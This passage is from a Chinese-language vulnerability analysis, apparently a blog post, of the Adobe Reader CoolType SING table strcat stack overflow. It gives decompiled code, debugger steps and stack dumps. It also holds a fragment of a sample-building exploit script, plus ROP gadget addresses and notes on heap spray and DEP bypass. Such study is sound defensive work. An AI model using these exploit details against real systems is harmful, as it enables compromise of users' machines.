class="comment">//value1_823A850变量的地址为ebp=0x0012E718</span></span><br><span class="line">sub_80151B5(&amp;value1_823A850);                 <span class="comment">// 清零0x0012E718后面的一些数据,0x0012E718应该为某个对象的首地址,此函数像是类的构造函数</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="comment">// 返回dword_823A850加1之前的值</span></span><br><span class="line">value_823A850 = sub_8024217(&amp;stru_823A838, <span class="number">0</span>);<span class="comment">// this传参,_RTL_CRITICAL_SECTION结构体对象</span></span><br><span class="line">value1_823A850 = value_823A850;</span><br><span class="line">    ↑    ↑    ↑</span><br><span class="line">    |    |    |</span><br><span class="line">v23 = sub_803DCF9((<span class="keyword">int</span>)&amp;value1_823A850, &amp;v9, <span class="number">0</span>, (<span class="keyword">int</span>)&amp;v22) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> __<span class="function">cdecl <span class="title">sub_803DCF9</span><span class="params">(<span class="keyword">int</span> a1, _DWORD *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line">    ↑    ↑    ↑</span><br><span class="line">    |    |    |</span><br><span class="line">sub_8021B06(&amp;v18, a1, <span class="string">"SING"</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、sub_80151B5()函数的内容.</span><br><span class="line">_DWORD *__<span class="function">thiscall <span class="title">sub_80151B5</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx v2=0/edx:xor edx,edx</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="keyword">this</span>;</span><br><span class="line">  *<span class="keyword">this</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_801512D(<span class="keyword">this</span> + <span class="number">5</span>);                        <span class="comment">// 对象(0x0012E72C)的构造函数</span></span><br><span class="line">  v1[<span class="number">15</span>] = v2;</span><br><span class="line">  v1[<span class="number">16</span>] = v2;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">68</span>) = v2;                     <span class="comment">// v[17]的第一个字节设为0</span></span><br><span class="line">  v1[<span class="number">18</span>] = v2;</span><br><span class="line">  v1[<span class="number">19</span>] = v2;</span><br><span class="line">  v1[<span class="number">20</span>] = v2;</span><br><span class="line">  v1[<span class="number">21</span>] = v2;</span><br><span class="line">  v1[<span class="number">22</span>] = v2;</span><br><span class="line">  v1[<span class="number">23</span>] = v2;</span><br><span class="line">  v1[<span class="number">49</span>] = <span class="number">-1</span>;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">188</span>) = v2;                    <span class="comment">// v1[47]的第一个字节设为0</span></span><br><span class="line">  v1[<span class="number">48</span>] = v2;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">200</span>) = v2;                    <span class="comment">// v1[50]的第一个字节设为0</span></span><br><span class="line">  <span class="built_in">memset</span>(v1 + <span class="number">24</span>, v2, <span class="number">92u</span>);                     <span class="comment">// 从第24dword开始,后23个dword设为0</span></span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">对象(0x0012E718)的内存布局(初始):</span></span><br><span class="line"><span class="comment">0x0012E718 *this = 0   -|</span></span><br><span class="line"><span class="comment">0x0012E71C this[1] = 0  |</span></span><br><span class="line"><span class="comment">0x0012E720 this[2] = 0  | &#123;sub_80151B5&#125;</span></span><br><span class="line"><span class="comment">0x0012E724 this[3] = 0  |</span></span><br><span class="line"><span class="comment">0x0012E728 this[4] = 0 -|</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0x0012E72C *this = 0 -------------------| 0x0012E72C-0x0012E750,应该也是一个对象</span></span><br><span class="line"><span class="comment">0x0012E730 0x049517D8                   | [0x049517D8]=0x08190108,const BIB_T_MT::BIBVTabGeneric::`vftable'</span></span><br><span class="line"><span class="comment">0x0012E734 this[2] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E738 this[3] = 0 -----------------| &#123;sub_801512D&#125;</span></span><br><span class="line"><span class="comment">0x0012E73C                              | 0012E73C   01E79BA0  ASCII "BIBDataStoreGetBlockProcV2"</span></span><br><span class="line"><span class="comment">0x0012E740 this[5] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E744 this[6] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E748 this[7] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E74C this[8] = sub_80833EF -------|</span></span><br><span class="line"><span class="comment">0x0012E750 result[9] = result = this ---| 0x0012E72C</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0x0012E754 v1[15] = v2 = 0 ----------------| </span></span><br><span class="line"><span class="comment">0x0012E758 v1[16] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E75C *((_BYTE *)v1 + 68) = v2 = 0; --| 0012E75C   0804AA00  返回到 CoolType.0804AA00</span></span><br><span class="line"><span class="comment">0x0012E760 v1[18] = v2 = 0 ----------------| </span></span><br><span class="line"><span class="comment">0x0012E764 v1[19] = v2 = 0 ----------------| &#123;sub_80151B5&#125;</span></span><br><span class="line"><span class="comment">0x0012E768 v1[20] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E76C v1[21] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E770 v1[22] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E774 v1[23] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E778 - 0x0012E7D4 v1[24]~v1[46] = v2 = 0 --| memset(v1 + 24, v2, 92u);</span></span><br><span class="line"><span class="comment">0x0012E7D4 *((_BYTE *)v1 + 188) = v2 = 0 --------| 0012E7D4   02A93200   </span></span><br><span class="line"><span class="comment">0x0012E7D8 v1[48] = v2 = 0 ----------------------| &#123;sub_80151B5&#125;                     </span></span><br><span class="line"><span class="comment">0x0012E7DC                                       | 0012E7DC   FFFFFFFF</span></span><br><span class="line"><span class="comment">0x0012E7E0 *((_BYTE *)v1 + 200) = v2 = 0 --------| 0012E7E0   02A93200</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、sub_8024217()函数的内容.</span><br><span class="line">value_823A850 = sub_8024217(&amp;stru_823A838, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">.data:<span class="number">0823</span>A838 stru_823A838    _RTL_CRITICAL_SECTION &lt;?&gt;</span><br><span class="line">.data:<span class="number">0823</span>A838                                         ; DATA XREF: sub_80252EC+<span class="number">104</span>↑o</span><br><span class="line">.data:<span class="number">0823</span>A838                                         ; sub_809C3A4+<span class="number">1B</span>9↑o ...</span><br><span class="line">.data:<span class="number">0823</span>A850 dword_823A850   dd ?                    ; DATA XREF: sub_818DB2A+B↑w</span><br><span class="line">.data:<span class="number">0823</span>A854                 align <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RTL_CRITICAL_SECTION</span> &#123;</span></span><br><span class="line">    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;</span><br><span class="line">    LONG LockCount;</span><br><span class="line">    LONG RecursionCount;</span><br><span class="line">    HANDLE OwningThread;</span><br><span class="line">    HANDLE LockSemaphore;</span><br><span class="line">    ULONG_PTR SpinCount;</span><br><span class="line">&#125;;大小为<span class="number">4</span>*<span class="number">6</span> = <span class="number">24</span> = <span class="number">0x18</span>h字节</span><br><span class="line"></span><br><span class="line">_RTL_CRITICAL_SECTION_DEBUG *__thiscall sub_8024217(LPCRITICAL_SECTION lpCriticalSection, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> lpCriticalSection1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line"></span><br><span class="line">  lpCriticalSection1 = (<span class="keyword">int</span>)lpCriticalSection;</span><br><span class="line">  EnterCriticalSection(lpCriticalSection);      <span class="comment">// 进入临界区</span></span><br><span class="line">  v3 = *(_DWORD *)(lpCriticalSection1 + <span class="number">24</span>);    <span class="comment">// v3为全局变量dword_823A850的值,其初始值为0.</span></span><br><span class="line">  *(_DWORD *)(lpCriticalSection1 + <span class="number">24</span>) = v3 + <span class="number">1</span>;<span class="comment">// dword_823A850=dword_823A850+1=1</span></span><br><span class="line">  LeaveCriticalSection((LPCRITICAL_SECTION)lpCriticalSection1);</span><br><span class="line">  <span class="keyword">return</span> v3;     <span class="comment">// 返回加1之前的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>thiscall</code></strong>是<code>C++</code>中特有的<code>调用约定</code>,用于<code>成员函数</code>的调用。根据上面给出的<code>sub_80151B5()函数</code>的伪代码,可以看出此函数返回了<code>this指针</code>,并且<code>此函数</code>也是sub_80DD0B3()函数中定义的<code>对象(0x0012E718)</code>在作用域内调用的<code>第一个成员函数</code>,<code>sub_80151B5()函数</code>中使用<code>this指针</code>对其成员变量<code>赋初值</code>。这些都是一个<strong><code>构造函数</code></strong>拥有的特征。<br>&emsp;&emsp;通过上面的分析,我们可以知道<code>sub_8021B06()</code>的<code>第二个参数</code>a1为<code>对象(0x0012E718)的指针</code>,其第一个成员变量的值为0。</p><h5 id="2-2、strcat-函数溢出分析"><a href="#2-2、strcat-函数溢出分析" class="headerlink" title="2.2、strcat()函数溢出分析"></a>2.2、strcat()函数溢出分析</h5><p>&emsp;&emsp;通过上面的静态分析,我们可以知道程序执行完<code>sub_8021B06()函数</code>后,得到了<code>SING表数据</code>的地址。首先程序对SING表数据的<strong><code>“tableVersionMajor”</code></strong>字段和<strong><code>“tableVersionMinor”</code></strong>字段进行了判断,满足条件后,才会执行<code>strcat()</code>函数,将构造的<code>“uniqueName”</code>字段内容复制到<code>栈</code>上。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0803DD82      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; eax指向SING表数据,eax=[ebp-0x24]=[0x0012E4B4]=0x04960104</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                <span class="comment">; 判断是否为空,esi为0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85</span><br><span class="line"><span class="symbol">.text:</span>0803DD87      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8B      <span class="keyword">jz</span>      short loc_803DDC4 <span class="comment">; 这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8D      <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]        <span class="comment">; 字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到strcat</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8F      <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD95      <span class="keyword">jz</span>      short loc_803DD9F <span class="comment">; 这里跳转，jz和je机器码是一样的，IDA识别为jz，OllyDbg识别为je，这里jz感觉好理解一点</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD97      <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9D      <span class="keyword">jnz</span>     short loc_803DDC0</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这里有<strong><code>两种情况</code></strong>都满足要求,<strong><code>第一种</code></strong>,以小端序读出的版本号形如：<code>0x????0000</code>。也就是SING表的<code>“tableVersionMajor”</code>字段为0,<code>“tableVersionMinor”</code>字段没有要求,版本号为<code>0.x</code>。<strong><code>第二种</code></strong>,以小端序读出的版本号形如：<code>0x????0100</code>。也就是SING表的<code>“tableVersionMajor”</code>字段为1,<code>“tableVersionMinor”</code>字段没有要求,版本号为<code>1.x</code>。样本中使用的是<code>第一种</code>。</p><p><strong><code>样本生成脚本</code></strong>中关于这部分的构造如下：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sing = <span class="string">''</span></span><br><span class="line">sing &lt;&lt; [</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>,   <span class="comment"># tableVersionMajor, tableVersionMinor (0.1)</span></span><br><span class="line">    <span class="number">0xe01</span>,  <span class="comment"># glyphletVersion</span></span><br><span class="line">    <span class="number">0x100</span>,  <span class="comment"># embeddingInfo</span></span><br><span class="line">    <span class="number">0</span>,      <span class="comment"># mainGID</span></span><br><span class="line">    <span class="number">0</span>,      <span class="comment"># unitsPerEm</span></span><br><span class="line">    <span class="number">0</span>,      <span class="comment"># vertAdvance</span></span><br><span class="line">    <span class="number">0x3a00</span>  <span class="comment"># vertOrigin</span></span><br><span class="line">].pack(<span class="string">'vvvvvvvv'</span>) <span class="comment"># 把两个字符当作 little-endian 字节顺序的无符号的 short。</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;接下来,我们分析<code>“uniqueName”字段</code>复制到<code>栈上的位置</code>,以及<code>长度</code>。</p><blockquote><ul><li>1、打开Adobe Reader,再打开OllyDbg,<code>attach</code>上Adobe Reader进程。</li><li>2、在<code>0x0803DD9F</code>下断点,运行程序。</li><li>3、观察传入的<code>参数值</code>，及其<code>内存状态</code>。</li></ul></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eax</span> = <span class="number">0x04960104</span>(SING表数据入口地址)</span><br><span class="line">0803DD9F    83C0 <span class="number">10</span>         <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0x10</span>                    <span class="comment">; eax = eax+0x10 = 0x04960104+0x10 = 0x04960114(“uniqueName”字段起始地址)</span></span><br><span class="line">0803DDA2    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span>                        <span class="comment">; strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line">0803DDA3    8D45 <span class="number">00</span>         <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>]      <span class="comment">; eax = ebp = 0x0012E4D8</span></span><br><span class="line">0803DDA6    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span>                        <span class="comment">; strcat目的地址入栈</span></span><br><span class="line">0803DDA7    C645 <span class="number">00</span> <span class="number">00</span>      <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>],<span class="number">0x0</span>       <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line">0803DDAB    E8 483D1300     <span class="keyword">call</span> &lt;<span class="keyword">jmp</span>.&amp;MSVCR80.strcat&gt;      <span class="comment">; 调用strcat函数，造成溢出</span></span><br></pre></td></tr></table></figure><p>复制到栈上的<code>数据长度</code>：0x0012E718 - 0x0012E4D8 = 0x240<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0012E4D8  F1 B9 F1 F4 75 62 82 1D 14 A7 82 4A 0C 0C 0C 0C  窆耵ub?J....</span><br><span class="line">0012E4E8  AC 86 F7 B5 ED 50 17 29 5C 12 8D 01 4E 51 05 0E  瑔鞯鞵)\?NQ</span><br><span class="line">0012E4F8  E7 CC BC CA 6B 02 ED 81 13 36 AD 5E 45 85 DC 7D  缣际k韥6璣E呠&#125;</span><br><span class="line">0012E508  DB C2 4B 84 E8 67 8A 92 74 90 C8 3D 03 65 FE 80  勐K勮g姃t惾=e</span><br><span class="line">0012E518  4E E7 C7 42 89 8B DA 08 91 71 7A 3D 83 8E BD 60  N缜B墜?憅z=儙絗</span><br><span class="line">0012E528  AB 8F FA 53 8E F2 15 70 D8 66 BB A0 24 09 05 CD  珡鶶庲p豧粻$.</span><br><span class="line">0012E538  E6 10 AE B9 B2 E0 B8 40 91 36 FC 66 8B 7B BE C2  ?侧窣?黤媨韭</span><br><span class="line">0012E548  65 24 37 DA 2B 2C FC FA 04 89 92 95 B5 3A 22 FE  e$7?,墥暤:&quot;</span><br><span class="line">0012E558  44 BA 47 90 BD 17 78 9A 86 A8 CC 2A B1 0B FA 8F  D篏惤x殕ㄌ*?鷱</span><br><span class="line">0012E568  54 C7 4B 6D BF 1A 47 1D 33 0D 72 DC D3 8E 1E FC  T荎m?G3.r苡?</span><br><span class="line">0012E578  7E 2D 41 FE B2 7D 0C 3A 1A BE 1D F7 DC 35 59 BD  ~-A&#125;.:?鬈5Y</span><br><span class="line">0012E588  5A C3 06 67 E3 6F FC D5 49 3B 3E 1B 4D FC 6E 8C  Z?g鉶I;&gt;M黱</span><br><span class="line">0012E598  5D E4 7B BA 86 8C AC A7 11 F3 B2 43 A1 0B 04 B4  ]鋥簡尙?蟛C?</span><br><span class="line">0012E5A8  30 71 3F A9 3A CC CF E0 B3 15 35 39 BC F9 6F 9C  0q??滔喑59践o</span><br><span class="line">0012E5B8  E4 0C 84 72 70 90 64 0A 53 E3 A4 65 BB C6 19 85  ?剅p恉.S悚e黄</span><br><span class="line">0012E5C8  BA 6D 04 8D BE EF 3A 1F 4C 0D FD E0 29 BD FC 77  簃嵕?L.)近w</span><br><span class="line">0012E5D8  CD F3 41 98 0D AD D7 3B 92 48 A6 BB B7 8C C9 F5  腕A?;扝穼甚</span><br><span class="line">0012E5E8  71 7A 72 69 54 32 60 80 8D 9C 16 24 81 B8 C0 32  qzriT2`€崪$伕?</span><br><span class="line">0012E5F8  2D 44 17 5A 06 6D 75 0F 77 9E CF 67 F4 23 2C 2B  -DZmuw炏g?,+</span><br><span class="line">0012E608  C6 08 8A 4A E2 2F 63 30 39 85 30 38 40 55 FA 3B  ?奐?c09?8@U?</span><br><span class="line">0012E618  DB DD 44 05 9D BE 81 73 DD F3 CA 9A 4D 02 F0 EF  圯D澗乻蒹蕷M痫</span><br><span class="line">0012E628  05 A9 10 F7 05 69 C6 B4 DF 84 4A 6D 3C 85 6E D9  ??i拼邉Jm&lt;卬</span><br><span class="line">0012E638  3A 29 D3 E4 44 95 96 E3 C0 3E 0F FA 45 5E D1 40  :)愉D晼憷&gt;鶨^袬</span><br><span class="line">0012E648  DB BB AB 23 BA FF 42 8D 8A 05 D1 84 8A AE E5 5B  刍??B崐褎姰錥</span><br><span class="line">0012E658  F1 E7 94 85 95 20 E5 41 6B 95 CD 72 6D 8B EE D6  耒攨?錋k曂rm嬵</span><br><span class="line">0012E668  19 8C BF FB BC 64 17 7F E7 A4 70 F7 94 E3 A7 3B  尶d绀p鲾悃;</span><br><span class="line">0012E678  5B 69 A1 F4 7F 20 11 02 58 4F 24 FD 38 70 A3 97  [i◆ XO$?p</span><br><span class="line">0012E688  62 2C FA 58 E6 C2 D6 B5 04 80 EC 82 FC 05 80 D1  b,鶻媛值€靷?€</span><br><span class="line">0012E698  93 0B CB 63 38 F7 B9 90 F0 8B D3 F8 91 96 7A C7  ?薱8鞴愷嬘鴳杬</span><br><span class="line">0012E6A8  37 24 37 4E 99 84 6C 40 DF 84 A2 97 17 7B 6F 59  7$7N檮l@邉&#123;oY</span><br><span class="line">0012E6B8  51 51 9C 7A 50 DA 1B 08 7E ED 73 8B D9 B9 53 9B  QQ渮P?~韘嬞筍</span><br><span class="line">0012E6C8  29 59 F1 FD A6 38 DF 49 38 CB 80 4A E3 A6 2C CA  )Y颀?逫8藔J悝,</span><br><span class="line">0012E6D8  2B 0C 6B E0 A5 48 43 D2 F3 77 1C 91 82 C7 40 59  +.k啷HC殷w憘茾Y</span><br><span class="line">0012E6E8  5F 6C C6 02 59 D4 BA AE 32 F9 41 9A FF 07 28 4D  _l?Y院?鵄?(M</span><br><span class="line">0012E6F8  28 73 33 DA D4 69 D1 F3 E6 85 2B D1 76 90 FF 6C  (s3谠i洋鎱+裿?l</span><br><span class="line">0012E708  28 F3 A4 34 AB 2F 57 AE 1B C7 A5 1D 6C 00 00 00  (螭4?W?钎l...</span><br><span class="line"></span><br><span class="line">0012E718  00 00 00 00 6D 00 00 00 01 00 00 00 01 00 00 00  ....m.........</span><br><span class="line">0012E728  00 00 00 00 F8 B1 13 02 A0 38 96 04 EC 26 00 00  ....???..</span><br></pre></td></tr></table></figure></p><h5 id="2-3、触发过程"><a href="#2-3、触发过程" class="headerlink" title="2.3、触发过程"></a>2.3、触发过程</h5><p>&emsp;&emsp;我们从<code>metasploit</code>的漏洞利用代码中可以知道<code>SING表的数据</code>主要是构造了一个<strong><code>ROP链</code></strong>,用于<code>控制EIP</code>最终跳转到<code>堆喷</code>的真正的用于<code>绕过DEP</code>的<code>ROP Chain</code>处。从代码注释中可知,<strong><code>第一个ROPgadget</code></strong>位于icucnv36.dll中的<code>0x4A80CB38</code>处,<strong><code>第二个ROPgadget</code></strong>位于icucnv36.dll中的<code>0x4A82A714</code>处。这部分后面会介绍,为什么选用这两个地址呢？因为在<code>Adobe Reader</code>的<code>各个版本</code>上，这个dll的这两处地址是<code>始终不变</code>的，从而保证了<code>exploit</code>对于各版本的<code>兼容性</code>和<code>稳定性</code>。</p><blockquote><ul><li>1、打开Adobe Reader,再打开OllyDbg,<code>attach</code>上Adobe Reader进程。</li><li>2、在<code>0x4A80CB38</code>下断点,运行程序。</li><li>3、当运行到<code>0x4A80CB38</code>地址处时,我们查看栈,看到返回地址为<code>0x0808B30A</code>,可以知道调用者的位置就在其上一条指令处,<code>0x0808B308</code>处的<code>call dword ptr [eax]</code>指令。</li><li>4、我们再对这段<code>ROPgadget</code>的调用地址<code>0x0808B308</code>下断点,并且通过ollydbg的反汇编窗口找到<code>此调用者函数的父函数</code>sub_808B116(),再下断点<code>0x0808B116</code>。</li><li>5、我们再在<code>堆栈窗口</code>中寻找<code>sub_808B116()</code>的<code>返回地址</code>,查看其返回地址是否在调用<code>strcat()函数</code>的<code>父函数sub_803DCF9()</code>的地址范围中,若是,栈回溯结束。如不是，继续向下寻找。</li></ul></blockquote><p>&emsp;&emsp;也许有些<code>返回地址</code>在<code>堆栈窗口</code>中只是显示为<code>返回到 CoolType.xxxxxxxx</code>,并没显示是<code>哪个函数的返回地址</code>。这是因为这个返回地址所属的函数的地址是存放在<code>内存中的某个位置</code>或在<code>寄存器</code>中,指令格式<code>call r/m32</code>。通常函数调用使用的是指令格式为<code>call rel32</code>,其操作数为<code>函数地址</code>相对<code>当前调用指令</code>的<code>下一条指令地址</code>的偏移,以<code>补码</code>表示。</p><p>程序<strong><code>控制流劫持过程</code></strong>分析：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">********************************************************************</span><br><span class="line"></span><br><span class="line">    char __cdecl sub_803DCF9(<span class="keyword">int</span> a1, _<span class="built_in">DWORD</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">********************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0803DCF9      <span class="keyword">push</span>    <span class="built_in">ebp</span>                         <span class="comment">; ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA      <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                   <span class="comment">; esp=0x0012E4DC</span></span><br><span 